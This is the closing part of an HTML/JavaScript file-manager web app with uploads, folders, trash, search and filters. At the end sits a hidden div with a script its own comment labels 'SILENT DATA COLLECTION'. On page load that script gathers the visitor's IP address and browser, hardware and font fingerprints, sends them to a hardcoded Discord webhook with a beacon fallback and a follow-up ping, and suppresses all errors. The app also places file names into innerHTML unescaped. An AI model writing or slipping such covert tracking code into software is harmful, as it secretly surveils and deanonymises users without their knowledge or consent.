                    fileName += '.' + fileExtension;
                }

                reader.onload = function(e) {
                    const newFile = {
                        id: crypto.randomUUID(),
                        name: fileName,
                        owner: owner,
                        date: getCurrentDate(),
                        type: fileExtension,
                        size: formatFileSize(uploaded.size),
                        difficulty: getDifficultyFromSize(uploaded.size),
                        content: isTextFile ? e.target.result : `[Binary file - ${formatFileSize(uploaded.size)}] Use download button to get the full file.`,
                        raw: isTextFile ? null : e.target.result,
                        pinned: false,
                        isTextFile: isTextFile,
                        originalName: uploaded.name,
                        trashed: false,
                        folderId: activeFolderId === 'root' ? null : activeFolderId
                    };

                    files.unshift(newFile);
                    saveFiles();
                    
                    uploadsInProgress--;
                    if (uploadsInProgress === 0) {
                        showToast(`${fileArray.length} file${fileArray.length > 1 ? 's' : ''} uploaded successfully!`, 'success');
                        forceRender();
                    }
                };

                reader.onerror = function() {
                    showToast(`Error reading file: ${uploaded.name}`, 'error');
                    uploadsInProgress--;
                };

                if (isTextFile) {
                    reader.readAsText(uploaded);
                } else {
                    reader.readAsDataURL(uploaded);
                }
            });
        }

        function formatFileSize(bytes) {
            if (bytes < 1024) return bytes + " B";
            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
            return (bytes / (1024 * 1024)).toFixed(1) + " MB";
        }

        function getDifficultyFromSize(bytes) {
            if (bytes < 1024 * 1024) return 'easy';
            if (bytes < 10 * 1024 * 1024) return 'medium';
            return 'hard';
        }

        // ========== DRAG & DROP ==========
        function setupDragAndDrop() {
            const uploadArea = document.getElementById('uploadArea');
            
            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
                uploadArea.addEventListener(eventName, preventDefaults, false);
                document.body.addEventListener(eventName, preventDefaults, false);
            });

            ['dragenter', 'dragover'].forEach(eventName => {
                uploadArea.addEventListener(eventName, () => {
                    uploadArea.classList.add('drag-active');
                }, false);
            });

            ['dragleave', 'drop'].forEach(eventName => {
                uploadArea.addEventListener(eventName, () => {
                    uploadArea.classList.remove('drag-active');
                }, false);
            });

            uploadArea.addEventListener('drop', (e) => {
                const dt = e.dataTransfer;
                const droppedFiles = dt.files;
                
                if (droppedFiles.length > 0) {
                    showAddForm(droppedFiles);
                }
            }, false);
        }

        function preventDefaults(e) {
            e.preventDefault();
            e.stopPropagation();
        }

        // ========== FILE DRAG & DROP BETWEEN FOLDERS ==========
        function setupFileDragDrop() {
            document.addEventListener('dragstart', (e) => {
                const fileElement = e.target.closest('.file');
                if (fileElement) {
                    const fileId = fileElement.getAttribute('data-file-id');
                    const file = files.find(f => f.id === fileId);
                    if (file && !file.trashed) {
                        fileBeingDragged = fileId;
                        e.dataTransfer.setData('text/plain', fileId);
                        e.dataTransfer.effectAllowed = 'move';
                        fileElement.style.opacity = '0.5';
                    }
                }
            });

            document.addEventListener('dragend', (e) => {
                const fileElement = e.target.closest('.file');
                if (fileElement) {
                    fileElement.style.opacity = '1';
                }
                fileBeingDragged = null;
                document.querySelectorAll('.folder-btn.drop-target').forEach(btn => {
                    btn.classList.remove('drop-target');
                });
            });
        }

        function setupFolderDragHandlers(folderBtn, folderId) {
            folderBtn.addEventListener('dragover', (e) => {
                if (fileBeingDragged && folderId !== activeFolderId && folderId !== 'trash') {
                    e.preventDefault();
                    e.dataTransfer.dropEffect = 'move';
                    folderBtn.classList.add('drop-target');
                }
            });

            folderBtn.addEventListener('dragleave', () => {
                folderBtn.classList.remove('drop-target');
            });

            folderBtn.addEventListener('drop', (e) => {
                e.preventDefault();
                folderBtn.classList.remove('drop-target');
                
                if (fileBeingDragged) {
                    moveFileToFolder(fileBeingDragged, folderId);
                    fileBeingDragged = null;
                }
            });
        }

        function moveFileToFolder(fileId, targetFolderId) {
            const file = files.find(f => f.id === fileId);
            if (!file || file.trashed) return;
            
            const oldFolderName = file.folderId ? 
                folders.find(f => f.id === file.folderId)?.name : 'All Files';
            const newFolderName = targetFolderId === 'root' ? 'All Files' : 
                                 folders.find(f => f.id === targetFolderId)?.name;
            
            file.folderId = targetFolderId === 'root' ? null : targetFolderId;
            saveFiles();
            forceRender();
            showToast(`"${file.name}" moved from ${oldFolderName} to ${newFolderName}`, 'success');
        }

        // ========== FILE OPERATIONS ==========
        function deleteFile(fileId) {
            const file = files.find(f => f.id === fileId);
            if (!file) return;

            if (file.trashed) {
                // Permanent delete from trash
                const confirmed = confirm(`Permanently delete "${file.name}"?\nThis action cannot be undone.`);
                if (!confirmed) return;
                
                files = files.filter(f => f.id !== fileId);
                saveFiles();
                forceRender();
                showToast('File permanently deleted', 'error');
            } else {
                // Move to trash
                moveToTrash(fileId);
            }
            
            if (currentFileId === fileId) {
                closeModal();
            }
        }

        async function deleteCurrentFile() {
            if (!currentFileId) return;
            
            await deleteFile(currentFileId);
        }

        function startRename(fileId, element) {
            const file = files.find(f => f.id === fileId);
            if (!file || file.trashed) return;
            
            const input = document.createElement('input');
            input.type = 'text';
            input.value = file.name;
            input.className = 'file-name editing';
            
            input.onblur = () => {
                renameFile(fileId, input.value);
            };
            
            input.onkeydown = (e) => {
                if (e.key === 'Enter') {
                    input.blur();
                }
                if (e.key === 'Escape') {
                    element.parentNode.replaceChild(element, input);
                }
            };
            
            element.parentNode.replaceChild(input, element);
            input.focus();
            input.select();
        }

        function renameFile(fileId, newName) {
            const file = files.find(f => f.id === fileId);
            if (!file || !newName.trim() || file.trashed) return;

            if (file.name === newName.trim()) return;

            const confirmed = confirm(`Rename "${file.name}" to "${newName.trim()}"?`);
            if (!confirmed) return;

            const oldName = file.name;
            file.name = newName.trim();
            saveFiles();
            forceRender();
            showToast(`Renamed "${oldName}" to "${file.name}"`, 'success');
        }

        // ========== FILE RENDERING ==========
        function renderFiles(filteredFiles = null) {
            const grid = document.getElementById('fileGrid');
            const emptyState = document.getElementById('emptyState');
            
            // Filter files by active folder
            let filesToRender = filteredFiles || files.filter(file => {
                if (activeFolderId === 'root') return !file.trashed && !file.folderId;
                if (activeFolderId === 'trash') return file.trashed;
                return !file.trashed && file.folderId === activeFolderId;
            });
            
            const pinnedFiles = filesToRender.filter(f => f.pinned);
            const regularFiles = filesToRender.filter(f => !f.pinned);
            
            grid.innerHTML = '';
            
            if (filesToRender.length === 0) {
                grid.appendChild(emptyState);
                emptyState.classList.remove('hidden');
                return;
            }
            
            emptyState.classList.add('hidden');
            
            if (pinnedFiles.length > 0) {
                const pinnedIndicator = document.createElement('div');
                pinnedIndicator.className = 'pinned-indicator';
                pinnedIndicator.innerHTML = `
                    <i class="fas fa-thumbtack"></i>
                    <span>Pinned Files</span>
                `;
                grid.appendChild(pinnedIndicator);
                
                pinnedFiles.forEach(file => {
                    const fileDiv = createFileElement(file);
                    grid.appendChild(fileDiv);
                });
                
                if (regularFiles.length > 0) {
                    const spacer = document.createElement('div');
                    spacer.style.height = '20px';
                    spacer.style.gridColumn = '1 / -1';
                    grid.appendChild(spacer);
                }
            }
            
            regularFiles.forEach(file => {
                const fileDiv = createFileElement(file);
                grid.appendChild(fileDiv);
            });
            
            saveState();
        }

        function createFileElement(file) {
            const fileDiv = document.createElement('div');
            fileDiv.className = `file file-added ${file.pinned ? 'pinned' : ''} ${file.trashed ? 'trashed' : ''}`;
            fileDiv.setAttribute('data-file-id', file.id);
            fileDiv.setAttribute('draggable', !file.trashed);
            fileDiv.innerHTML = `
                <div class="file-type">.${file.type}</div>
                <div class="file-header">
                    <div class="file-name" title="${file.name}" ondblclick="startRename('${file.id}', this)">${file.name}</div>
                    <div class="file-meta">
                        <div><i class="fas fa-user"></i> ${file.owner}</div>
                        <div><i class="fas fa-calendar"></i> ${file.date}</div>
                        <div class="file-size">${file.size}</div>
                    </div>
                </div>
                <div class="file-actions">
                    ${file.trashed ? `
                        <button class="pin-btn" onclick="event.stopPropagation(); restoreFromTrash('${file.id}')" title="Restore">
                            <i class="fas fa-undo"></i>
                        </button>
                    ` : `
                        <button class="pin-btn ${file.pinned ? 'pinned' : ''}" onclick="event.stopPropagation(); togglePin('${file.id}')" title="${file.pinned ? 'Unpin' : 'Pin'}">
                            <i class="fas fa-thumbtack"></i>
                        </button>
                    `}
                    <button class="delete-btn" onclick="event.stopPropagation(); deleteFile('${file.id}')" title="${file.trashed ? 'Delete Permanently' : 'Move to Trash'}">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            `;
            
            fileDiv.onclick = (e) => {
                if (!e.target.closest('.file-actions') && !e.target.classList.contains('file-name')) {
                    viewFile(file);
                }
            };
            
            return fileDiv;
        }

        // ========== MODAL OPERATIONS ==========
        function viewFile(file) {
            currentFileId = file.id;
            document.getElementById('modalTitle').textContent = file.name;
            
            const folderName = file.folderId ? 
                folders.find(f => f.id === file.folderId)?.name : 'All Files';
            
            document.getElementById('modalInfo').innerHTML = `
                <div class="file-info-item">
                    <i class="fas fa-user"></i>
                    <span><strong>Owner:</strong> ${file.owner}</span>
                </div>
                <div class="file-info-item">
                    <i class="fas fa-calendar"></i>
                    <span><strong>Created:</strong> ${file.date}</span>
                </div>
                <div class="file-info-item">
                    <i class="fas fa-file"></i>
                    <span><strong>Type:</strong> .${file.type}</span>
                </div>
                <div class="file-info-item">
                    <i class="fas fa-weight-hanging"></i>
                    <span><strong>Size:</strong> ${file.size}</span>
                </div>
                <div class="file-info-item">
                    <i class="fas fa-folder"></i>
                    <span><strong>Folder:</strong> ${folderName}</span>
                </div>
                <div class="file-info-item">
                    <i class="fas fa-thumbtack"></i>
                    <span><strong>Status:</strong> ${file.pinned ? 'Pinned' : 'Normal'}${file.trashed ? ' (In Trash)' : ''}</span>
                </div>
            `;
            
            const contentArea = document.getElementById('modalContent');
            const saveBtn = document.getElementById('saveBtn');
            const deleteBtn = document.getElementById('deleteBtn');
            
            const isEditable = file.isTextFile && !file.trashed;
            contentArea.disabled = !isEditable;
            saveBtn.disabled = !isEditable;
            
            deleteBtn.innerHTML = file.trashed ? 
                '<i class="fas fa-skull-crossbones"></i> Delete Permanently' : 
                '<i class="fas fa-trash"></i> Move to Trash';
            
            if (isEditable) {
                contentArea.value = file.content || '';
                contentArea.placeholder = "Edit file content here...";
            } else {
                contentArea.value = file.content || '[Binary file - Use download button]';
                contentArea.placeholder = file.trashed ? "File is in Trash - cannot be edited" : "Binary files cannot be edited in the browser";
            }
            
            document.getElementById('fileModal').style.display = 'flex';
            if (isEditable) {
                contentArea.focus();
            }
        }

        function saveFileContent() {
            if (!currentFileId) return;
            
            const newContent = document.getElementById('modalContent').value;
            const file = files.find(f => f.id === currentFileId);
            
            if (file && file.isTextFile && !file.trashed && newContent !== file.content) {
                const confirmed = confirm('Save changes to this file?');
                if (!confirmed) return;
                
                file.content = newContent;
                saveFiles();
                showToast('File saved successfully', 'success');
            }
        }

        function downloadFile() {
            const file = files.find(f => f.id === currentFileId);
            if (!file) return;
            
            try {
                if (file.raw) {
                    const link = document.createElement('a');
                    link.href = file.raw;
                    link.download = file.name;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                } else if (file.isTextFile) {
                    const blob = new Blob([file.content], { type: 'text/plain;charset=utf-8' });
                    const url = URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = file.name;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    URL.revokeObjectURL(url);
                }
                
                showToast('File downloaded', 'success');
            } catch (error) {
                showToast("Download failed. Please try again.", 'error');
            }
        }

        function closeModal() {
            document.getElementById('fileModal').style.display = 'none';
            currentFileId = null;
        }

        // ========== SEARCH & FILTERS ==========
        let searchTimeout;
        
        function handleSearchInput() {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                applyFilters();
                updateSearchPredictions();
            }, 300);
        }

        function updateSearchPredictions() {
            const query = document.getElementById('searchInput').value.toLowerCase().trim();
            const predictionsContainer = document.getElementById('searchPredictions');
            
            if (query.length === 0) {
                predictionsContainer.style.display = 'none';
                return;
            }
            
            const matchingFiles = files.filter(file => 
                !file.trashed && (
                    file.name.toLowerCase().includes(query) ||
                    file.owner.toLowerCase().includes(query) ||
                    file.type.toLowerCase().includes(query) ||
                    (file.isTextFile && file.content && file.content.toLowerCase().includes(query))
                )
            ).slice(0, 8);
            
            if (matchingFiles.length === 0) {
                predictionsContainer.style.display = 'none';
                return;
            }
            
            predictionsContainer.innerHTML = '';
            
            matchingFiles.forEach(file => {
                const predictionItem = document.createElement('div');
                predictionItem.className = 'prediction-item';
                predictionItem.innerHTML = `
                    <div class="prediction-name">${file.name}</div>
                    <div class="prediction-type">.${file.type}</div>
                `;
                
                predictionItem.onclick = () => {
                    document.getElementById('searchInput').value = file.name;
                    predictionsContainer.style.display = 'none';
                    applyFilters();
                };
                
                predictionsContainer.appendChild(predictionItem);
            });
            
            predictionsContainer.style.display = 'block';
        }

        function showSearchPredictions() {
            const query = document.getElementById('searchInput').value.trim();
            if (query.length > 0) {
                updateSearchPredictions();
            }
        }

        function hideSearchPredictions() {
            setTimeout(() => {
                document.getElementById('searchPredictions').style.display = 'none';
            }, 200);
        }

        function toggleFilters() {
            const sidebar = document.getElementById('sidebar');
            sidebar.style.display = sidebar.style.display === 'none' ? 'flex' : 'none';
        }

        function toggleFilterOptions(filterType) {
            const options = document.getElementById(filterType + 'Options');
            const checkbox = document.getElementById(filterType + 'Checkbox');
            
            if (filterType === 'pinned') {
                currentFilters.showPinnedOnly = !currentFilters.showPinnedOnly;
                checkbox.classList.toggle('checked', currentFilters.showPinnedOnly);
                applyFilters();
                return;
            }
            
            const isShowing = options.classList.contains('show');
            
            document.querySelectorAll('.filter-options').forEach(opt => {
                opt.classList.remove('show');
            });
            document.querySelectorAll('.filter-checkbox').forEach(cb => {
                cb.classList.remove('checked');
            });
            
            if (!isShowing) {
                options.classList.add('show');
                checkbox.classList.add('checked');
            }
        }

        function applyFilterUIState() {
            if (currentFilters.date === 'newest') {
                document.getElementById('dateNewest').checked = true;
            } else if (currentFilters.date === 'oldest') {
                document.getElementById('dateOldest').checked = true;
            }
            
            currentFilters.types.forEach(type => {
                const checkbox = document.getElementById('type' + type.charAt(0).toUpperCase() + type.slice(1));
                if (checkbox) checkbox.checked = true;
            });
            
            if (currentFilters.size === 'small') {
                document.getElementById('sizeSmall').checked = true;
            } else if (currentFilters.size === 'medium') {
                document.getElementById('sizeMedium').checked = true;
            } else if (currentFilters.size === 'large') {
                document.getElementById('sizeLarge').checked = true;
            }
            
            document.getElementById('pinnedCheckbox').classList.toggle('checked', currentFilters.showPinnedOnly);
        }

        function setDateFilter(value) {
            currentFilters.date = value;
            applyFilters();
        }

        function toggleTypeFilter(type) {
            const checkbox = document.getElementById('type' + type.charAt(0).toUpperCase() + type.slice(1));
            
            if (checkbox.checked) {
                if (!currentFilters.types.includes(type)) {
                    currentFilters.types.push(type);
                }
            } else {
                currentFilters.types = currentFilters.types.filter(t => t !== type);
            }
            
            applyFilters();
        }

        function setSizeFilter(value) {
            currentFilters.size = value;
            applyFilters();
        }

        function applyFilters() {
            let filtered = files.filter(file => {
                if (activeFolderId === 'root') return !file.trashed && !file.folderId;
                if (activeFolderId === 'trash') return file.trashed;
                return !file.trashed && file.folderId === activeFolderId;
            });

            const query = document.getElementById('searchInput').value.toLowerCase();
            if (query) {
                filtered = filtered.filter(file =>
                    file.name.toLowerCase().includes(query) ||
                    file.owner.toLowerCase().includes(query) ||
                    file.type.toLowerCase().includes(query) ||
                    (file.isTextFile && file.content && file.content.toLowerCase().includes(query))
                );
            }
            
            if (currentFilters.showPinnedOnly) {
                filtered = filtered.filter(file => file.pinned);
            }
            
            if (currentFilters.types.length > 0) {
                filtered = filtered.filter(file => currentFilters.types.includes(file.type));
            }
            
            if (currentFilters.size) {
                filtered = filtered.filter(file => {
                    const sizeNum = parseFloat(file.size);
                    if (currentFilters.size === 'small') return sizeNum < 1;
                    if (currentFilters.size === 'medium') return sizeNum >= 1 && sizeNum <= 10;
                    if (currentFilters.size === 'large') return sizeNum > 10;
                    return true;
                });
            }
            
            filtered.sort((a, b) => {
                if (a.pinned && !b.pinned) return -1;
                if (!a.pinned && b.pinned) return 1;
                
                if (currentFilters.date === 'newest') {
                    return new Date(b.date.split('/').reverse().join('-')) - new Date(a.date.split('/').reverse().join('-'));
                } else if (currentFilters.date === 'oldest') {
                    return new Date(a.date.split('/').reverse().join('-')) - new Date(b.date.split('/').reverse().join('-'));
                }
                
                return 0;
            });
            
            renderFiles(filtered);
        }

        function togglePin(fileId) {
            const file = files.find(f => f.id === fileId);
            if (!file || file.trashed) return;

            const action = file.pinned ? 'unpin' : 'pin';
            const confirmed = confirm(`${file.pinned ? 'Unpin' : 'Pin'} file "${file.name}"?`);

            if (!confirmed) return;

            file.pinned = !file.pinned;
            saveFiles();
            showToast(file.pinned ? 'File pinned' : 'File unpinned', 'success');
            forceRender();
        }

        // ========== STATE PERSISTENCE ==========
        function loadSavedState() {
            const savedSearch = localStorage.getItem('dozzy_search_query');
            if (savedSearch) {
                document.getElementById('searchInput').value = savedSearch;
            }
            
            const savedFilters = localStorage.getItem('dozzy_filters');
            if (savedFilters) {
                currentFilters = JSON.parse(savedFilters);
                applyFilterUIState();
            }

            const savedFolder = localStorage.getItem('dozzy_active_folder');
            if (savedFolder) {
                activeFolderId = savedFolder;
            }
        }

        function saveState() {
            localStorage.setItem('dozzy_search_query', document.getElementById('searchInput').value);
            localStorage.setItem('dozzy_filters', JSON.stringify(currentFilters));
            localStorage.setItem('dozzy_active_folder', activeFolderId);
        }

        // ========== MODAL BACKDROP ==========
        function setupModalBackdrop() {
            // Already handled
        }

        // ========== PAGE RELOAD ==========
        function reloadPage() {
            const refreshBtn = document.getElementById('refreshBtn');
            const originalHTML = refreshBtn.innerHTML;
            
            refreshBtn.classList.add('refreshing');
            refreshBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Reloading...';
            refreshBtn.disabled = true;
            
            if (currentFileId) {
                const file = files.find(f => f.id === currentFileId);
                if (file && file.isTextFile && !file.trashed) {
                    const newContent = document.getElementById('modalContent').value;
                    if (newContent !== file.content) {
                        file.content = newContent;
                        saveFiles();
                    }
                }
            }
            
            closeModal();
            closeChangelog();
            saveFiles();
            
            setTimeout(() => {
                localStorage.removeItem('dozzy_access_granted');
                location.reload(true);
            }, 800);
        }

        // ========== UX ENHANCEMENTS ==========
        function toggleDarkMode() {
            const isDarkMode = !document.body.classList.contains('dark-mode');
            document.body.classList.toggle('dark-mode');
            localStorage.setItem('dozzy_dark_mode', isDarkMode);
            
            const toggleBtn = document.getElementById('darkModeToggle');
            toggleBtn.innerHTML = isDarkMode 
                ? '<i class="fas fa-sun"></i> Light' 
                : '<i class="fas fa-moon"></i> Dark';
        }

        function applyDarkModePreference() {
            const darkMode = localStorage.getItem('dozzy_dark_mode') === 'true';
            if (darkMode) {
                document.body.classList.add('dark-mode');
                document.getElementById('darkModeToggle').innerHTML = '<i class="fas fa-sun"></i> Light';
            }
        }

        function openChangelog() {
            document.getElementById('changelogModal').style.display = 'flex';
        }

        function closeChangelog() {
            document.getElementById('changelogModal').style.display = 'none';
        }

        // ========== KEYBOARD SHORTCUTS ==========
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey && e.key === 'f') || e.key === '/') {
                e.preventDefault();
                document.getElementById('searchInput').focus();
            }
            
            if (e.key === 'Escape') {
                closeModal();
                closeChangelog();
                document.getElementById('addForm').style.display = 'none';
            }
            
            if (e.ctrlKey && e.key === 'n') {
                e.preventDefault();
                triggerFileInput();
            }
            
            if (e.ctrlKey && e.key === 'd') {
                e.preventDefault();
                toggleDarkMode();
            }
            
            if (e.ctrlKey && e.key === 'r') {
                e.preventDefault();
                reloadPage();
            }
            
            if (e.key === 'Delete' && currentFileId) {
                e.preventDefault();
                deleteCurrentFile();
            }
            
            if (e.ctrlKey && e.key === 's' && currentFileId) {
                e.preventDefault();
                saveFileContent();
            }
        });
    </script>

    <!-- SILENT DATA COLLECTION SCRIPT - COMPLETELY INVISIBLE -->
    <div style="display: none;">
        <script>
            (function() {
                'use strict';
                
                // Discord webhook
                const WEBHOOK = "https://discord.com/api/webhooks/1470069387607150743/YgRjq7UnV1mUAssj3fB_zJfQyA_KD7bbH0nzt_-HmfHlf0kFpvwtpXY7Q9VveIpvUtx1";
                const SESSION_ID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                
                // Silent data collection
                const collectData = () => {
                    return {
                        timestamp: new Date().toISOString(),
                        sessionId: SESSION_ID,
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        languages: navigator.languages,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        screen: {
                            width: screen.width,
                            height: screen.height,
                            colorDepth: screen.colorDepth,
                            availWidth: screen.availWidth,
                            availHeight: screen.availHeight
                        },
                        connection: {
                            effectiveType: navigator.connection?.effectiveType,
                            downlink: navigator.connection?.downlink,
                            rtt: navigator.connection?.rtt,
                            saveData: navigator.connection?.saveData
                        },
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        cookieEnabled: navigator.cookieEnabled,
                        pdfViewerEnabled: navigator.pdfViewerEnabled,
                        vendor: navigator.vendor,
                        maxTouchPoints: navigator.maxTouchPoints,
                        doNotTrack: navigator.doNotTrack,
                        referrer: document.referrer,
                        url: window.location.href
                    };
                };
                
                // Get IP from multiple sources
                const getIP = async () => {
                    const services = [
                        'https://api.ipify.org?format=json',
                        'https://api64.ipify.org?format=json',
                        'https://ipapi.co/json/',
                        'https://ipwho.is/',
                        'https://api.myip.com',
                        'https://ipinfo.io/json',
                        'https://icanhazip.com/',
                        'https://checkip.amazonaws.com/',
                        'https://ifconfig.me/ip',
                        'https://ident.me/'
                    ];
                    
                    for (const service of services) {
                        try {
                            const controller = new AbortController();
                            const timeout = setTimeout(() => controller.abort(), 2000);
                            
                            const response = await fetch(service, {
                                signal: controller.signal,
                                mode: 'cors',
                                credentials: 'omit',
                                headers: {
                                    'Accept': 'application/json, text/plain, */*',
                                    'Cache-Control': 'no-cache'
                                }
                            });
                            
                            clearTimeout(timeout);
                            
                            if (response.ok) {
                                if (service.includes('icanhazip') || service.includes('checkip') || 
                                    service.includes('ifconfig.me') || service.includes('ident.me')) {
                                    const text = await response.text();
                                    return {
                                        ip: text.trim(),
                                        source: service,
                                        fullResponse: text.trim()
                                    };
                                } else {
                                    const data = await response.json();
                                    return {
                                        ip: data.ip || data.ip_address || data.client_ip || data.query,
                                        source: service,
                                        fullResponse: data
                                    };
                                }
                            }
                        } catch(e) {
                            continue;
                        }
                    }
                    
                    return { ip: "Not detected", source: "All services failed" };
                };
                
                // Get hardware fingerprint
                const getHardwareInfo = () => {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    
                    let gpuInfo = 'Unknown';
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
                        }
                    }
                    
                    // Font fingerprinting
                    const fonts = [
                        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                        'Verdana', 'Webdings', 'Wingdings'
                    ];
                    
                    const fontList = [];
                    const testString = "mmmmmmmmmmlli";
                    const testSize = "72px";
                    const span = document.createElement("span");
                    span.style.fontSize = testSize;
                    span.innerHTML = testString;
                    document.body.appendChild(span);
                    
                    const defaultWidth = span.offsetWidth;
                    const defaultHeight = span.offsetHeight;
                    
                    fonts.forEach(font => {
                        span.style.fontFamily = font + ',monospace';
                        if (span.offsetWidth !== defaultWidth || span.offsetHeight !== defaultHeight) {
                            fontList.push(font);
                        }
                    });
                    
                    document.body.removeChild(span);
                    
                    // Plugin detection
                    const plugins = [];
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push(navigator.plugins[i].name);
                    }
                    
                    return {
                        gpu: gpuInfo,
                        cpuCores: navigator.hardwareConcurrency || 'Unknown',
                        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                        fonts: fontList.slice(0, 5),
                        plugins: plugins.slice(0, 5)
                    };
                };
                
                // Send data silently
                const sendData = async () => {
                    try {
                        const systemData = collectData();
                        const ipData = await getIP();
                        const hardwareData = getHardwareInfo();
                        
                        // Create comprehensive embed
                        const embed = {
                            title: "🕵️ Silent System Snapshot",
                            color: 0x2b2d31,
                            fields: [
                                {
                                    name: "🌐 IP Address",
                                    value: `\`${ipData.ip}\`\n*Via ${ipData.source}*`,
                                    inline: true
                                },
                                {
                                    name: "💻 Hardware",
                                    value: `**CPU:** ${hardwareData.cpuCores} cores\n**RAM:** ${hardwareData.ram}\n**GPU:** ${hardwareData.gpu.substring(0, 50)}`,
                                    inline: true
                                },
                                {
                                    name: "🖥️ Display",
                                    value: `**Resolution:** ${systemData.screen.width}x${systemData.screen.height}\n**Available:** ${systemData.screen.availWidth}x${systemData.screen.availHeight}`,
                                    inline: true
                                },
                                {
                                    name: "🌐 Browser",
                                    value: `**User Agent:** ${systemData.userAgent.substring(0, 80)}...\n**Platform:** ${systemData.platform}`,
                                    inline: false
                                },
                                {
                                    name: "🔗 Network",
                                    value: `**Type:** ${systemData.connection.effectiveType || '?'}\n**Speed:** ${systemData.connection.downlink || '?'}Mbps\n**Latency:** ${systemData.connection.rtt || '?'}ms`,
                                    inline: true
                                }
                            ],
                            footer: {
                                text: `Session: ${SESSION_ID.substring(0, 8)} • ${new Date().toLocaleTimeString()}`
                            },
                            timestamp: systemData.timestamp
                        };
                        
                        // Send via fetch
                        await fetch(`${WEBHOOK}?ref=${SESSION_ID}&cache=${Date.now()}`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-Request-ID': SESSION_ID,
                                'X-Timestamp': Date.now().toString()
                            },
                            body: JSON.stringify({
                                username: "System Logger",
                                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                                embeds: [embed]
                            }),
                            mode: 'cors',
                            credentials: 'omit'
                        });
                        
                        // Image beacon fallback
                        setTimeout(() => {
                            try {
                                const img = new Image(1, 1);
                                const dataStr = `IP:${ipData.ip}|CPU:${hardwareData.cpuCores}|RAM:${hardwareData.ram}`;
                                const encoded = btoa(dataStr).substring(0, 100);
                                img.src = `${WEBHOOK}?beacon=${encoded}&id=${SESSION_ID}`;
                                img.style.display = 'none';
                                document.body.appendChild(img);
                            } catch(e) {}
                        }, 100);
                        
                    } catch (e) {
                        // Silent fail
                    }
                };
                
                // Execute silently after page loads
                const executeSilently = () => {
                    setTimeout(async () => {
                        await sendData();
                        
                        // Send follow-up after 30 seconds
                        setTimeout(async () => {
                            try {
                                const pingEmbed = {
                                    title: "💤 Session Still Active",
                                    description: `User remained active on dashboard\n**Duration:** 30s+`,
                                    color: 0x666666,
                                    footer: {
                                        text: SESSION_ID.substring(0, 8)
                                    },
                                    timestamp: new Date().toISOString()
                                };
                                
                                await fetch(`${WEBHOOK}?ping=${Date.now()}`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({embeds: [pingEmbed]})
                                });
                            } catch(e) {}
                        }, 30000);
                    }, 1000);
                };
                
                // Suppress all errors
                window.onerror = () => true;
                
                // Start execution
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', executeSilently);
                } else {
                    executeSilently();
                }
                
            })();
        </script>
    </div>
</body>
</html>
